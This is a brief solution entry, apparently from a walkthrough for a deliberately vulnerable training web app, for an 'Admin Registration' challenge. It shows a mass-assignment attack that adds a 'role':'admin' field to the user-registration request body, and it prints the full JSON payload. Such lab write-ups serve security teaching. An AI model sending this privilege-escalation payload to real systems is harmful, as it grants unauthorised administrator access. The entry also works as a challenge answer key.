# Level 3

## Admin Registration
_Register as a user with administrator privileges._

Modify the body of the user registration request (`POST /api/Users/`) by adding `"role":"admin",`:
```
{
  "email": "admin@mail",
  "role": "admin",
  "password": "admin1",
  "passwordRepeat": "admin1",
  "securityQuestion": {
    "id": 1,
    "question": "Your eldest siblings middle name?",
    "createdAt": "2020-08-13T14:12:54.775Z",
    "updatedAt": "2020-08-13T14:12:54.775Z"
  },
  "securityAnswer": "Whatever"
}
```